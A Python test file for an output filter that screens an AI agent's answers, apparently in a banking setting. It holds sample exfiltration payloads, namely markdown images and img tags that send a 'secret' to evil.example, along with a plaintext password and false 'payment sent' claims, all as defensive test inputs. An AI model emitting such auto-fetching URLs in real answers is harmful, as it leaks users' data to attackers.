from core.gate import DecisionAction
from core.output_filter import OutputFilterContext, RULE_EXPLANATIONS, filter_answer


def test_f1_removes_markdown_image_with_exfil_url():
    result = filter_answer("Summary. ![remote](https://evil.example/c?d=secret) ![inline](data:image/png;base64,AAAA)", OutputFilterContext())
    assert "![remote]" not in result.text and "![inline]" not in result.text
    assert any(item.rule_id == "F1" for item in result.decisions)


def test_f1_keeps_plain_text_without_active_content():
    result = filter_answer("Your inbox contains three messages.", OutputFilterContext())
    assert result.text == "Your inbox contains three messages."
    assert not any(item.rule_id == "F1" for item in result.decisions)


def test_f1_removes_html_auto_fetch_content():
    result = filter_answer("Hello <img src=\"https://evil.example/x\"> world", OutputFilterContext())
    assert "<img" not in result.text
    assert any(item.rule_id == "F1" for item in result.decisions)


def test_f2_removes_unknown_link_but_keeps_allowlisted_link():
    ctx = OutputFilterContext(trusted_domains={"example.com"})
    result = filter_answer("https://example.com/help and https://evil.example/x", ctx)
    assert "https://example.com/help" in result.text
    assert "https://evil.example/x" not in result.text
    assert any(item.rule_id == "F2" for item in result.decisions)


def test_f3_removes_sensitive_data_from_url_even_if_host_is_allowed():
    ctx = OutputFilterContext(trusted_domains={"example.com"}, sensitive_values={"GB82WEST12345698765432"})
    result = filter_answer("https://example.com/?id=GB82WEST12345698765432", ctx)
    assert "sensitive data" in result.text
    assert any(item.rule_id == "F3" for item in result.decisions)


def test_f4_removes_ungrounded_iban_and_keeps_grounded_amount():
    ctx = OutputFilterContext(user_command="Tell me about my payment of $25", raw_tool_outputs=[{"amount": "$25"}])
    result = filter_answer("Pay GB82WEST12345698765432. The amount was $25.", ctx)
    assert "GB82WEST12345698765432" not in result.text
    assert "$25" in result.text
    assert any(item.rule_id == "F4" for item in result.decisions)


def test_f5_rewrites_false_sent_claim():
    result = filter_answer("I sent the payment successfully.", OutputFilterContext())
    assert "not completed" in result.text
    assert any(item.rule_id == "F5" for item in result.decisions)


def test_f5_keeps_claim_matching_executed_action():
    ctx = OutputFilterContext(executed_calls=["banking.send_money"], action_completed=True)
    result = filter_answer("I sent the payment successfully.", ctx)
    assert result.text == "I sent the payment successfully."
    assert not any(item.rule_id == "F5" for item in result.decisions)


def test_f6_masks_own_iban_and_password():
    ctx = OutputFilterContext(profile={"iban": "GB82WEST12345698765432"})
    result = filter_answer("Your account is GB82WEST12345698765432. password=hunter2", ctx)
    assert "GB82WEST12345698765432" not in result.text and "hunter2" not in result.text
    assert any(item.rule_id == "F6" for item in result.decisions)


def test_f6_allows_secret_when_user_requested_it():
    ctx = OutputFilterContext(profile={"balance": "$50"}, answer_requested_secrets=True)
    result = filter_answer("Your balance is $50.", ctx)
    assert "$50" in result.text
    assert not any(item.rule_id == "F6" for item in result.decisions)


def test_every_non_allow_rule_has_human_reason_and_hash_is_raw():
    raw = "I sent the transfer"
    result = filter_answer(raw, OutputFilterContext())
    assert result.raw_answer_hash
    assert result.decisions and all(item.action == DecisionAction.BLOCK and item.reason_human for item in result.decisions)
    assert all(item.get("reason_human") for item in RULE_EXPLANATIONS.values())
